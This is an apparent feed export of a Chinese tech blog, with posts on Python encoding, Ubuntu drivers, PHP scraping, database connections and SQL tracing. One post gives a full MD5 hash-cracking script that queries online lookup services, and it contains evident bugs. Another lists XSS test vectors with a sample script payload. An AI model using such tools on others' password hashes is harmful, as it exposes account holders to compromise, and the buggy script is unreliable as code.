<img class="alignnone" src="https://cdn.securelist.com/files/2016/01/blog_corebot_3.png" alt="" width="838" height="207" />
此外，我们还分析了该木马和CC服务器的通信，它似乎对俄罗斯手机银行服务特别感兴趣，
在新年假期，新的改动在俄罗斯通过短信疯狂传播。短短一个星期内，从2015.12.28到2016.01.04，我们已发现6500名感染的用户，该木马由此跻身最活跃的恶意程序TOP5.。Asacub改版后发展的速度才有所减缓，我们将继续跟踪这类恶意软件。</p>

<p><strong>[参考来源<a href="https://securelist.com/blog/research/73211/the-asacub-trojan-from-spyware-to-banking-malware/" target="_blank">securelist</a>，转载请注明本站翻译]</strong></p>
]]></content>
      <categories>
        
          <category> translate </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[python字符编码处理]]></title>
      <url>/%E7%BC%96%E7%A8%8B%E4%B9%8B%E8%B7%AF/2015/08/04/python-e5-ad-97-e7-ac-a6-e7-bc-96-e7-a0-81-e5-a4-84-e7-90-86/</url>
      <content type="html"><![CDATA[<p><strong><span style="color: #00B050;">最近因业务需求在写爬虫时，遇到点编码的问题，加上以前曾被类似问题困扰过，特此记录一下。</span></strong>
由于开发和使用环境常在Linux和Win下切换，常遇到字符处理错误，总结一些问题如下：</p>

<p><span style="color: #ff0000;">1.如何中文匹配网页内容，而不会被各种编码扰乱</span></p>
<pre lang="python">s="编码"
rs=unicode(s, "utf8")
u'\u7f16\u7801'</pre>
<p>很简单普遍的做法，unicode编码能很好的转码中文，平时储存中文字符串时可以：</p>
<pre lang="python">x=u'编码'</pre>
<p>但是这有可能会报错，python在字符处理时忒蛋疼，怎么办？</p>
<pre lang="python">reload(sys)
sys.setdefaultencoding('utf-8')</pre>
<p>又是非常简单而万精油的两句代码，默认把文件编码设成utf-8，在这时光是在代码头部写上#coding=utf-8之类的是不太管用的。
<span style="color: #ff0000;">2.网上摘抄一段内容，也是自己遇到过的，关于把文字直接解码。</span></p>
<pre lang="python">Traceback (most recent call last):
File "ChineseTest.py", line 3, in 
print open("Test.txt").read().decode("utf-8")
UnicodeEncodeError: 'gbk' codec can't encode character u'\ufeff' in position 0: illegal multibyte sequence</pre>
<p>原来，某些软件，如notepad，在保存一个以UTF-8编码的文件时，会在文件开始的地方插入三个不可见的字符（0xEF 0xBB 0xBF，即BOM）。
因此我们在读取时需要自己去掉这些字符，python中的codecs module定义了这个常量：</p>
<pre lang="python"># coding=gbk
import codecs
data = open("Test.txt").read()
if data[:3] == codecs.BOM_UTF8:
data = data[3:]
print data.decode("utf-8")
结果：abc中文</pre>
<p><span style="color: #ff0000;">3.在Win下保存文件时，注意下保存文件的编码，鄙人一般选UTF8，默认的ANSI和UNICODE感觉不太好用。里面的内容换到Linux下容易报错。</span>
<span style="color: #ff0000;">4.编码和解码，这样的姿势也是可以的：</span></p>
<pre lang="python">x=r'\u7f16\u7801'
print x.decode("unicode_escape")
编码</pre>
<p><span style="color: #ff0000;">
5.话不多说看图，中文字符串的比较:</span></p>
<pre lang="python">'编码'.decode('utf-8') == u'编码'
True

'编码' == u'编码'
__main__:1: UnicodeWarning: Unicode equal comparison failed to convert both arguments to Unicode - interpreting them as being unequal
False

unicode('编码') == u'编码'
Traceback (most recent call last):
  File "", line 1, in 
UnicodeDecodeError: 'ascii' codec can't decode byte 0xe7 in position 0: ordinal not in range(128)</pre>
<p><span style="color: #ff0000;">6.附上一个链接，本文上述的问题里面多有讲述，但鄙人没有一一验证过，但确实很详细。</span>
<span style="color: #ff00ff;"><a title="Python、Unicode和中文" href="http://blog.csdn.net/summerhust/article/details/6654150" target="_blank"><span style="color: #ff00ff;">Python、Unicode和中文</span></a></span></p>

<p>文章是记录型，很简单的东西，不喜勿喷。
<span style="color: #00B050;">[转载请注明来源<a href="http://blog.hellsec.net" target="_blank"><span style="color: #00B050;">本站</span></a>,谢谢。]</span></p>
]]></content>
      <categories>
        
          <category> 编程之路 </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Ubuntu更新显卡驱动失败解决办法]]></title>
      <url>/system/2014/10/13/ubuntu-e6-9b-b4-e6-96-b0-e6-98-be-e5-8d-a1-e9-a9-b1-e5-8a-a8-e5-a4-b1-e8-b4-a5-e8-a7-a3-e5-86-b3-e5-8a-9e-e6-b3-95/</url>
      <content type="html"><![CDATA[<table>
  <tbody>
    <tr>
      <td>前段时间因为做项目，一直整夜整夜地挂机爬站，笔记本用成台式机的负荷也是醉了-_-</td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>由此出现了一个问题，鄙人笔记本物理机装的Ubuntu13.04，在挂机或者待机一段时间不能恢复登录状态，一直黑屏。对于这种情况本屌只有一个劲儿的敲键盘试图唤醒，结果只能弹出一个纯命令行，切回图形界面后控制面板却没了。</p>

<p>于是乎，本屌在网上查了下，似乎是因为显卡驱动的原因，好嘛，那就更新显卡驱动，在Ubuntu软件更新器里面（图形化的）点了一个最新版的，兴冲冲地重启然后登陆，啪，尼玛，黑屏。。不死心再来一遍，还是那样，差点就泪奔了，这项目还没做完呢，一会儿搞半天没时间了咋办  T_T</p>

<p>找大牛求助，指点去Ubuntu社区翻了翻，找出一篇<span style="color: #ff0000;"><a href="http://forum.ubuntu.org.cn/viewtopic.php?t=217062" target="_blank"><span style="color: #ff0000;">帖子</span></a></span>，说是可以恢复模式切回原来的状态，重启看了下，似乎需要安装盘，我去，屌丝表示没准备Ubuntu的安装盘，这条果断Pass。</p>

<p>接着找到一篇<span style="color: #ff0000;"><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=94&amp;t=140531" target="_blank"><span style="color: #ff0000;">帖子</span></a></span>，让本屌在错误日志里面，找到安装新显卡驱动时的报错，查了下并没有出错，估计只是不兼容？然后在安装日志里试图直接进行卸载，未果。</p>

<p>网上还有坑爹<span style="color: #00B050;"><a href="http://blog.csdn.net/crazyboy2009/article/details/8232158" target="_blank"><span style="color: #00B050;">教程</span></a></span>让直接卸载显卡驱动，然后后来就没后文了，尼玛，当本屌傻麽，直接卸载了不管依赖关系想重装系统麽，最好别酱紫做！</p>

<p>后来本屌的解决办法是通过<strong><span style="color: #ff00ff;"><a href="http://jishu.zol.com.cn/140483.html" target="_blank"><span style="color: #ff00ff;">更新软件列表源</span></a></span></strong>，搞一个叫Paa的玩意儿，将所有的包更新到了最新版本（还是13.x），然后才解决了。</p>

<p>附上：<span style="color: #ff00ff;"><strong>sudo apt-get dist-upgrade</strong></span>（里面的上两条其实不用）</p>

<p>顺便附上一个没有成功的<span style="color: #00B050;"><a href="http://forum.ubuntu.org.cn/viewtopic.php?f=42&amp;p=2973310" target="_blank"><span style="color: #00B050;">案例</span></a></span>，以及后来看到的一个复杂<span style="color: #00B050;"><a href="http://forum.ubuntu.org.cn/viewtopic.php?t=384333" target="_blank"><span style="color: #00B050;">例子</span></a></span>。</p>

<p>现在暂时用着笔记本还没出问题，如果再出现相应情况，打算试试这个<span style="color: #ff0000;"><a href="http://zhidao.baidu.com/link?url=rBeSSVPGK3lwAQVX3Rlj6oHY6_8bUiz-oY8CsIJAs4gTHg747YRiG8OVxSU21jS0GX7DqC4XVDO1EKlvBZViHK" target="_blank"><span style="color: #ff0000;">案例</span></a></span>，似乎是啥笔记本模式，看起来有点靠谱。其实最好的法子就是设置电源选项让它不挂起，不过在公司有闲杂人员出入，也只能将就了。</p>

<p><strong><span style="color: #00B050;">还有，大家没事不要乱更新卸载驱动之类的，坑爹的一B。。</span></strong></p>

<p>===================</p>

<p><strong><span style="color: #00B050;">Enjoy yourself！</span></strong></p>
]]></content>
      <categories>
        
          <category> system </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[对于python框架Scrapy+Gevent的研究]]></title>
      <url>/other/2014/09/20/e5-af-b9-e4-ba-8epython-e6-a1-86-e6-9e-b6scrapygevent-e7-9a-84-e7-a0-94-e7-a9-b6/</url>
      <content type="html"><![CDATA[<p><span style="color: #00ffff;"><strong>没错，标题党君又来了！文章只是做些第三方评论，不喜勿喷。</strong></span></p>

<p>前几天看到<span style="color: #ff0000;"><a title="Freebuf" href="http://www.freebuf.com/tools/43194.html" target="_blank"><span style="color: #ff0000;">FB上的一篇文章</span></a></span>，是将用Scrapy爬虫框架加以关键词词尝试，从而将可用的关键词与相应的URL返回存到结果里，个人感觉还是有比较大的改进空间的。覆盖攻击向量字段如下：</p>

<p>Http头中的Referer字段
User-Agent字段
Cookie
表单（包括隐藏表单）
URL参数
RUL末尾，如 www.example.com/&lt;script&gt;alert(1)&lt;/script&gt;
跳转型XSS</p>

<p>由于英文说明书的原作者说该Scrapy的XSS延伸版不能进行Ajax判断，还是有点小遗憾，希望日后改进。</p>

<p>感觉其提供的测试页面爬下来效果不错，我这儿没有图床可用，就不展示了。（<strong><span style="color: #00B050;">话说有朋友可以给鄙人一免费图床地址么，2333333</span></strong>）</p>

<p>附上该Git的地址：<a title="xsscrapy" href="https://github.com/DanMcInerney/xsscrapy" target="_blank"><span style="color: #ff0000;">下载</span></a>。</p>

<p>还有就是，本人测试用的是Ubuntu13.04，作者建议pip安装，鄙人使用自带的安装包pip，表示有不少问题，后来在网上下了一个<span style="color: #ff0000;"><a title="pip1.5" href="https://pypi.python.org/packages/source/p/pip/pip-1.5.4.tar.gz" target="_blank"><span style="color: #ff0000;">1.5版本</span></a></span>的才成功。此外，个人感觉apt-get安装确实挺给力，除了没有的包以外，基本很难报错（知道肯定有人吐槽这B说的不是废话么^_^，以前一个朋友就挺爱骂我SB，不过可惜再也没能见到他了）。</p>

<p>PS：里面所需的BeautifulSoup最好用BeautifulSoup3.2.1，BeautifulSoup4.x版本已改名为bs4，坑惨小弟了，半天没反应过来。其他的pip安装（如pybloom），也可apt-get安装（如py-requests）,最后，对付某<span style="color: #00B050;">error: command ‘x86_64-linux-gnu-gcc’ failed with exit status 1</span>错误时，<span style="color: #00B050;">sudo apt-get install python-twisted-web python2.7-dev</span>，可能会用的上。</p>

<p>Scrapy是个不错的爬虫框架，最近笔者自己打算好好研究一下，结合注入工具进行爬虫式扫描，感觉应该不错的样子。如果有朋友有兴趣，或者有现货，欢迎提出宝贵建议，不胜感激。</p>

<p>另外，前面提到的Gevent是一名访客告诉小弟的，查看了下，是Python的一个高并发框架（高级术语名为协程）。没记错的话，还是以前那位爱骂我SB的朋友告诉我的（小感伤一下），因为以前有做分布式监控的想法。以后考虑将其纳入做项目的计划范围。</p>

<p>本文很水，不过以后有心得会更新的，除非有单独料，我会单独提出。</p>

<p><span style="color: #00ffff;">Enjoy yourself.^_^</span></p>

<p> </p>

<p> </p>

<p> </p>
]]></content>
      <categories>
        
          <category> other </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Md5批量+多接口破解脚本]]></title>
      <url>/tools/2014/09/08/md5-e6-89-b9-e9-87-8f-e5-a4-9a-e6-8e-a5-e5-8f-a3-e7-a0-b4-e8-a7-a3-e8-84-9a-e6-9c-ac/</url>
      <content type="html"><![CDATA[<p>=~~~~~~~~~~~~~~~~~~~~<del>=
+———–DemonSpider—————-+
+-Code reset by demon@f4ck.net—-+
+———-<a title="blog.hellsec.net" href="http://blog.hellsec.net" target="_blank">blog.hellsec.net</a>————+
=</del>~~~~~~~~~~~~~~~~~~~~=
<span style="color: #ff0000;">PS:个人觉得这脚本最大的特点就是多接口+批量，当然，也可单选。</span>
代码预览如下：</p>
<pre lang="python">
# -*- coding=utf-8 -*-
import sys
import socket
import urllib
import re
import string
import urllib2
import threading
import HTMLParser
import cookielib

def showInfo():
    print """
     命令格式：md5_crack.py -hash md5hash \n
			or md5_crack.py -dic
           """

comcn_tmp=[]


class timer(threading.Thread): 
    def __init__(self, HASH):  
        threading.Thread.__init__(self)  
        self.HASH = HASH    
   
    def run(self):  
        try:
            if crack_md5asia(self.HASH):
                return True
        except Exception,e:
            print e
            pass
        
        try:
            if crack_cc(self.HASH):
                return True
        except Exception,e:
            print e
            pass
        
        try:
            if crack_silic(self.HASH):
                return True
        except Exception,e:
            print e
            pass
        
        try:
            if crack_comcn(self.HASH):
                return True
        except Exception,e:
            print e
            pass

        try:
            if crack_somd5(self.HASH):
                return True
        except Exception,e:
            print e
            pass
        
        print "[x]HASH Crack: "+self.HASH+" failed."
        f.writelines(HASH+'\n')
        return False 
              


class Parselinks(HTMLParser.HTMLParser):
    def handle_starttag(self,tag,attrs):
        if tag == 'input':
            for name,value in attrs:
                if name == 'name':
                    if value != 'sand':
                        continue
                    else:
                        count=0
                        for name,value in attrs:
                            count=count+1
                            if count == 3: 
                                comcn_tmp.append(value)

        if tag == 'input':
            for name,value in attrs:
                if name == 'name':
                    if value != 'token':
                        continue
                    else:
                        count=0
                        for name,value in attrs:
                            count=count+1
                            if count == 3: 
                                comcn_tmp.append(value)


#From http://www.md5.asia/
def crack_md5asia(Hash):   
    str_url=["http://md5ss.sinaapp.com/md5_decode.php?decoder=1&amp;timeout=10&amp;hash=",Hash]
    url="".join(str_url)
    #print url
            
    try:
        sock=urllib.urlopen(url)
        htmlSources=sock.read()
    except:
        #print "Not Found"
        return False
    else:
        sock.close()
    #本来这个地方，应该比较"未找到,"，但是由于编码的问题，会出问题。因此，改为16进制了。
    if string.find(htmlSources,"\346\234\252\346")!=-1:
        return False
        #print "Not Found2"
    else:
        print "Password Found:",htmlSources
        s.writelines(HASH+' '+resp+'\n')
        print 'asia:',resp
        return True
        #exit(1)


def crack_comcn(HASH):

    cj = cookielib.CookieJar();
    opener = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))
    urllib2.install_opener(opener)
    parsed = Parselinks()
    parsed.feed(urllib.urlopen('http://www.md5.com.cn').read())
    post_data = {'md': HASH ,'sand':comcn_tmp[0],'token':comcn_tmp[1],'submit':'MD5+Crack'}
    post_data_urlencode = urllib.urlencode(post_data)
    requrl = "http://www.md5.com.cn/md5reverse"
    req = urllib2.Request(url = requrl,data =post_data_urlencode)
    req.add_header('Referer', "http://www.md5.com.cn/")
    resps = urllib2.urlopen(req)
    match = re.findall('Result:.*green"&gt;.*&lt;\/span',resps.read())
    re_match=re.findall('green"&gt;.*&lt;\/span&gt;&lt;div',match[0])[0][7:-11]
    #print re_match[0][7:-11]
    s.writelines(HASH+' '+re_match+'\n')
    print 'comcn:',re_match
    return True



def crack_silic(HASH):
    post_data = {'isajax':'1' ,'md5':HASH}
    post_data_urlencode = urllib.urlencode(post_data)
    requrl = "http://cracker.blackbap.org/?do=search&amp;language=en"
    req = urllib2.Request(url = requrl,data =post_data_urlencode)
    res_data = urllib2.urlopen(req)
    res = res_data.read()
    #print res
    resp = re.findall('Password <strong>.*&lt;\/strong&gt;',res)[0][17:-9]
    #print resp
    s.writelines(HASH+' '+resp+'\n')
    print 'silic:',resp
    return True

def crack_cc(HASH):
    url='http://www.md5.cc/ShowMD5Info.asp?GetType=ShowInfo&amp;no-cache=0.4669540437658686&amp;md5_str='+HASH+'&amp;_='
    request = urllib2.Request(url)
    request.add_header('Referer', "http://www.md5.cc/")
    res=urllib2.urlopen(request).read()
    resp = re.findall('25px"&gt;.*&lt;\/span&gt;',res)[0][6:-7].strip()
    #print resp[6:-7].strip()
    s.writelines(HASH+' '+resp+'\n')
    print "cc:",resp
    return True

def crack_somd5(HASH):

    resp=urllib.urlopen('http://www.somd5.com/somd5-md5-js.html').read()
    ajax_data=re.findall('isajax=.*&amp;',resp)[0][7:-1]
    post_data = {'isajax':ajax_data,'md5':HASH}
    post_data_urlencode = urllib.urlencode(post_data)
    requrl = "http://www.somd5.com/somd5-index-md5.html"
    req = urllib2.Request(url = requrl,data =post_data_urlencode)
    resps = urllib2.urlopen(req).read()
    match = re.findall('&lt;h1.*line;"&gt;.*&lt;\/h1',resps)[0]
    re_match = re.findall('"&gt;.*&lt;/',match)[0][2:-2]
    s.writelines(HASH+' '+resp+'\n')
    print "somd5",resp
    return True


if '__main__' == __name__:         

#这个简单脚本借用了一哥们儿的框架，虽然改动不少，按理确实应该留下原先那个兄弟版权的。。
#可是我在论坛搜了半天都没搜到。。完全遗忘了原版在哪儿找的有木有！！
#要是这兄弟看到了可以跟小弟联系，不嫌弃的话我加上~	

    print """
     =~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~=
     +-----------DemonSpider-----------+
     +--------Md5-Cracker--V1.0--------+
     +----------blog.hellsec.net--------+
     +--md5_crack.py for single or dic-+
     ===================================
                    = =
                   == ==
                ===&lt;-|-&gt;===
                 ====D====
                  ===e===
                   ==m==
                    =o=
                     n
    """
    global f,s

    if len(sys.argv)&lt;2 :
         print "参数错误"
         showInfo()
         exit(1)
     
    cmds = ['-hash','-dic']
     
    s=open('success_result.txt','w+')
    f=open('fail_result.txt','w+')
    cmd = sys.argv[1]
    if len(sys.argv) == 3 :
        Hash=sys.argv[2]
         
		 
    if 0 == cmds.count(cmd):  
        print cmd
        print "参数错误"
        showInfo()
        exit(1)
    else:
        print 'Start working,Please waiting...'
        if cmd == '-hash':
            if len(Hash)==16 or len(Hash)==32:
                crack_thread = timer(Hash)
                crack_thread.start()
                #crack_thread.setDamon()
                crack_thread.join()
            else:
                print "Hash长度出错."
        elif cmd == 'dic':
            for line in open('hash.txt','r'):
                if len(line.strip())==16 or len(line.strip())==32:
                    crack_thread = timer(line.strip())
                    crack_thread.start()

                else:
                    continue
    s.close()
    f.close()
    print "Crack ending...."
&lt;/pre&gt;
接口共五个，经小弟自己测试还算合手。

用法：
python md5_cracker.py -hash md5hash
python md5_cracker.py -dic

字典文件：
hash.txt
成功结果文件：success_result.txt
失败结果文件：fail_result.txt

<span style="color: #00B050;">附件。。就懒得发了吧。。^m^</span>
</strong></pre>
]]></content>
      <categories>
        
          <category> tools </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[php采集器小记]]></title>
      <url>/coding/2014/06/29/php-e9-87-87-e9-9b-86-e5-99-a8-e5-b0-8f-e8-ae-b0/</url>
      <content type="html"><![CDATA[<p>好吧，本屌承认又在糊弄朋友们了，这个没啥特别的，就是记录下一次帮人弄个简单的小说采集器时遇到的一些小问题。</p>

<p> </p>

<p><span style="color: #ff6600;">第一，如何截取特定标签间的内容：</span></p>

<p>当然，用可（dou）爱（bi）的正则可以解决，在期间遇到一个有趣的地方，本来是直接匹配的标签对的正则内容，然后作为数组输出，</p>

<p>可惜越界包含了其他标签，事实证明了只要（.*?），保证不为空就行。但是在期间查了份资料，preg_quote将需要匹配的内容保持为转义状态，</p>

<p>也就是不用特地去加反斜杠之类的，但是鄙人尝试输出时，并未成功。</p>

<p> </p>

<p><span style="color: #ff6600;">第二，如何处理爬取乱码：</span></p>

<p>在爬取过程中，可能会出现乱码，我们需要在实际运用过程中，考虑是否定义网页编码，或者定义输出编码，抑或是输出时进行转换，参考资料如下：</p>

<p>http://www.cnblogs.com/amboyna/archive/2008/04/21/1163116.html  php链接数据库编码问题</p>

<p><span>header(“Content-Type: text/html;charset=utf-8”);   网页头部加入可解决部分乱码</span></p>

<p><span>http://cn2.php.net/manual/en/function.mb-convert-encoding.php  php各种编码函数转换</span></p>

<p>。。。 这条我忘了0rz…</p>

<p> </p>

<p><span style="color: #ff6600;">第三，如何处理数据量大带来的边界溢出：</span></p>

<p>其实这点问题我没解决，网上找了个方法好像很屌的样子，不过我这里没成功，即在php.ini里修改，</p>

<p>加上pcre.backtrack_limit=-1，然后preg_replace,preg_match_all，此类的边界问题可能会得到解决。</p>

<p> </p>

<p><span style="color: #ff6600;">第四，如何清除文中空格，标点，以及标签：</span></p>

<p>标签清除可用strips_tag，简单粗暴。至于空格标签？试着preg_replace和str_replace，前者需要正则，后者直接替换的字符串。</p>

<p>在此期间需要注意，不可见及不能识别文字可通过编码，如urldecode进行具象化，然后将其替换再decode。如：http://zhidao.baidu.com/link?url=Ppil4x5ruvZ8mZX2w20jOJN-X_ZjwelCDVtjtGZ5ra_QD4Wq5ckIP4SOxAP3g7qDk9S-C3jcpSzXF9VHim-iZq</p>

<p>还有很重要的一点，不同编码的脚本，里面的规则如正则里的符号是不一样的，需要特别转换一下文件属性。PS:\s可代表空格tab一类。</p>

<p> </p>

<p><span style="color: #ff6600;">第五，如何采集文章的中文并且随机取出关键词：</span></p>

<p>UTF-8：</p>

<p>用mb_substr($str, 0, 100, ‘utf-8’) 或者mb_strcut($str, 0, 120, ‘utf-8’);
第一个方法是截取100个字，不是100个字节，utf-8编码 第二个方法是100个字节
这两个方法都不会乱码的
先产生随机数字，在根据随机数字调用上面的方法，注意，加了utf-8可能会造成数据取不到，鄙人并未找出原因，猜测是取到的正好为过滤掉的乱码字符。</p>

<p>GBK:</p>

<p>chr(rand(161,215)).chr(rand(161,249))，utf8的是三位。</p>

<p>使用时请注意函数mb_strlen，mt_rand（用于随机）。</p>

<p> </p>

<p><span style="color: #ffff00;">最后，附上两个带感的文献：</span></p>

<p>http://www.jb51.net/article/30024.htm  PHP压缩html网页代码</p>

<p>http://bbs.chinaunix.net/thread-3567100-1-1.html  php中如何截取中文字符串</p>

<p> </p>

<p> </p>

<p> </p>
]]></content>
      <categories>
        
          <category> coding </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[关于python和php数据库连接问题]]></title>
      <url>/data/2014/05/17/e5-85-b3-e4-ba-8epython-e5-92-8cphp-e6-95-b0-e6-8d-ae-e5-ba-93-e8-bf-9e-e6-8e-a5-e9-97-ae-e9-a2-98/</url>
      <content type="html"><![CDATA[<p>在几天的对完结项目的修正中，涉及到一些对python和php数据库的连接问题的处理。
在其中有关于系统方面的，也有库相关的，在这里做一个小小的总结。</p>

<p><span style="color: #ff0000;">1.python数据库连接</span>
mysql：import MySQLdb
mssql：import pymssql
这里小提一下，pyodbc也是可以连接的，至于有没有pdo的库，偶也不知道。</p>

<p><span style="color: #ff0000;">2.php的数据库连接</span>
mysql：
连接方法海了去了，pdo,odbc,mysql默认连接法子（不需要加扩展，一般用这个）。
<span style="color: #00B050;">mssql：</span>
在这里要分在win下和在linux下了，在win下很是方便：
可以sqlsrv,这个是微软官方提供的连接方式，在大多数dll啥失效后还能用，如：
http://www.php.net/manual/zh/book.sqlsrv.php</p>

<p>鄙人在codeigniter论坛找到一个利用方法，如：
https://github.com/EllisLab/CodeIgniter/tree/develop/system/database/drivers/sqlsrv
下载两个文件sqlsrv_driver.php，sqlsrv_result.php即可。
然后在入口文件包含核心文件之前包含上面两个文件。
配置方法：
http://stackoverflow.com/questions/19460025/how-do-i-connect-codeigniter-to-a-sql-server</p>

<p>PS:这个也是php标准拓展。
在win下也需要处理一系列php高版本后对mssql不再支持的问题，话说在php6后只支持pdo连接了。
在此之前可以用pdo和odbc，或者服务器开启了mssql模块的话，可以直接mssql_connect，但仍要在php.ini里改下extension配置即可。</p>

<p><span style="color: #00B050;">在linux下：</span>
不想提了，蛋都碎了。
在linux下做mssql连接，很重要的一点就是freetds,这玩意儿linux连接mssql必备。mssql是从sybase衍生出来的，有一些哥们做了一些sybase的linux下的连接库，这些连接库同时也能支持mssql，
我用的时候是0.9吧（0.8也可），在这时配置的版本需要弄成8.0,具体的我就不再详述，多查阅资料大家会恍然的。
安装完freetds后（可以下载安装包安装，也可以yum、apt-get源安装），
在这里提供一个下载链接：http://blog.csdn.net/kunp/article/details/387013</p>

<p>然后就是选择mssql_connect还是pdo还是odbc,暂时找到这几种方法，令人纠结心痛的是这几种方法似乎都要重新编译php，将环境啥配置啥的重新编译进去，由于鄙人找了半天确实没找到他说的php源代码安装目录下ext目录的mssql目录，然后去configure，所以这条路pass掉，其中需要phpize编译的步奏，也pass掉，鄙人perl环境出过问题，执行老出相关错误（明白怎么回事的大牛欢迎吐槽，偶是昏了）。所以意思是php扩展的连接库文件**.so等压根不能生成，也谈不上去php.ini里去改啥扩展配置路径，蛋碎一地。
怎么办呢？基友告诉我个法子，让我不装扩展，直接用php-mssql，鄙人centos6，yum了一下，坑比的没有安装包，直接被丢了一脸的链接：
https://gist.github.com/shf/2052432
通过这个方法我装上了php-mssql（需要代理），然后yum安装了php-odbc，然后，然后木有连上mssql，不知道咋回事，这个问题留着解决，猜测应该是还要做其他配置，完全是基友跟我瞎摸索有木有。。</p>

<p><span style="color: #00B050;">后记：此方法可行！不过需要关闭selinux，它拦截了端口！远程连接mysql相同，不止需要注意iptables！</span></p>

<p><span style="color: #00B050;">附上链接：http://blog.csdn.net/feng2375/article/details/7354045</span></p>

<p><span style="color: #00B050;">权限授予：http://blog.163.com/guotao_163/blog/static/2368282201010422031307/</span></p>

<p><span style="color: #00B050;">特殊模式改密码需注意：http://blog.csdn.net/hzw2312/article/details/8968806</span></p>

<p> </p>

<p><span style="color: #ff0000;">3.关于mssql开启远程</span>
大家知道如果要让外服务器访问，sqlserver必须开启远程，开启1433，在这里稍稍说下。
http://www.360doc.com/content/13/0525/23/19147_288191810.shtml
这篇文章介绍的比较全，但是偶的1433端口一直没开，telnet xx.xx.xx.xx 1433不上。</p>

<p>怎么办，如：
http://hi.baidu.com/daheshuiman/item/6dad61982dd267895814615d
把1433端口配上启用、活动。
记住sql-server browser必须打开。
在网上有说sqlserver2005 版本0.8以下的需要打补丁才开的了，也就说至少要打上sp3以上的补丁。
PS:在这里提下，我自己用时sql-server browser没有打开，按钮灰色，所以需要要把所有属性勾上活动，所有勾上是，这点特别注意。
开启了后一般就能看的1433能telnet上了。外连时，据网上说，可以直接用ip,还有说需要加sqlserver实例名，偶表示不明觉厉。</p>

<p>附上另两篇参考文章:
http://www.2cto.com/database/201304/204867.html
http://wenwen.sogou.com/z/q410734670.htm</p>

<p>最后，偶因为在linux环境下，无法连接mssql，只好退而求其次，连接mysql，但是原来的数据却是放在mssql里的，所以需要将数据转移：
https://github.com/Nick011/MSSQL-to-MySQL/blob/master/convert_db.py
在这里看到，在两个数据库都在开始开启了cursor后，在insert了才commit(),但是注意看最后，每一次循环都要commit一次，
说明连接时只连接一次的。好吧，这个好像弱爆了。。</p>

<p><span style="color: #00ffff;">最后，上面讲的很粗不是本人意愿啊！！！完全是因为实验时老爷机崩溃了，资料引用全部丢失，以上大部分凭记忆拼接，所以缺漏之处，</span>
<span style="color: #00ffff;"> 还请不吝赐教，感谢！’</span></p>

<p> </p>
]]></content>
      <categories>
        
          <category> data </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[SQL历史语句的追踪宝典]]></title>
      <url>/data/2014/04/20/sql-e5-8e-86-e5-8f-b2-e8-af-ad-e5-8f-a5-e7-9a-84-e8-bf-bd-e8-b8-aa-e5-ae-9d-e5-85-b8/</url>
      <content type="html"><![CDATA[<p>鄙人最近在进行一个小项目，前面的文章提到过，在这几天做到了数据库行为分析这块儿。</p>

<p>我们如果拿到历史语句，可以进行一个反黑阔的追踪，可以进行数据异常分析。查数据库历史语句时，我们还能顺带进行各种日志审计和监控记录，对于运维的朋友来说很有帮助。</p>

<p>那么，我们如何获得数据库的执行过的历史语句呢，能否自动将其导出？定时处理数据？或者能否做中间件将其过滤？</p>

<p>鄙人在这里将在这里做一个详细的讲解。</p>

<p><strong><span style="line-height: 1.6; color: #ff0000;">1.Mssql：</span></strong></p>

<p>mssql的历史语句的获取和处理着实让鄙人痛苦了一把，在网上曾找到以下几种方法。</p>

<p>（1）sql server profiler</p>

<p>（2）sqldiag</p>

<p>（3）log explorer</p>

<p>我们先来看第一个，这个是sql server自带的追踪分析工具（<span style="color: #33cccc;">单独下载的版本很挫，功能少，鄙人找了很久没找到好的</span>），图形化界面操作，可以选择性过滤，可以手动保存产生的trace内容。缺点：不能自动保存（<span style="color: #33cccc;">网上有人说可以计划任务启动再保存啥的，没找到方法</span>），耗资源（mssql套件通病），资源多了很不好看（也可以通过一定的方法过滤）。</p>

<p>至于第二个sqldiag，默认位置：C:\Program Files\Microsoft SQL Server\90\Tools\Binn\。网上说其在log目录能产生一个叫sqldiag.txt的文件，里面可以看到历史语句，估计是鄙人人品太挫了，表示没看见这个文件。找遍了所有的trc文件也没看见我要的结果。曾经找一个基友appleu0帮忙试验了下，他也仅仅是在关闭程序后才看到一个文件生成（<span style="color: #33cccc;">文件名是啥我忘了Orz..</span>），且这个程序好像最多能记录最后一百条的数据，很挫，虽然还是够轻量级。</p>

<p>最后看看第三个，log explorer。其中提供两个强大的工具：日志分析浏览，对象恢复。这里讲老实话，我自己试的时候没有用成功，因为我采用的是windows认证，在安装连接数据库时老出错，后来一怒就不用了，但听某基友讲这个还是蛮好用，不过也达不到我的要求。</p>

<p>朋友们可能要问，那我最后采用的方法是什么呢，难道比上面几个现成的工具都要好么？</p>

<p>没错，虽然不一定比上面几个都好，但绝对是最便捷的，最轻量级的，因为它没有借助任何第三方工具（<span style="color: #33cccc;">呕吐。。</span>），采用的是mssql的自带的追踪器trace（profiler的本质）。</p>

<p>如何创建一个trace？</p>

<p>1）执行存储过程sp_trace_create创建一个追踪器</p>

<p>2）执行存储过程sp_trace_setevent添加自己想订阅的事件以及最终结果集的列名</p>

<p>3）执行存储过程sp_trace_setfilter设置过滤器来对过滤产生数据</p>

<p>附上代码：</p>
<pre lang="sql">DECLARE @return_code INT;
 DECLARE @TraceID INT;
 DECLARE @maxfilesize BIGINT;
 DECLARE @Onset BIT;  --------弄了个bit型变量
 SET @Onset = 1; 	
 SET @maxfilesize = 200; ------（单位为M）弄了个大点的，一般不会增长太多，增长太多肯定出问题了，让他自动关闭！
 --step 1: create a new empty trace definition
 EXEC sp_trace_create
                 @traceid OUTPUT
                , @options = 2           -------文件大小达到顶峰时会自增到新文件
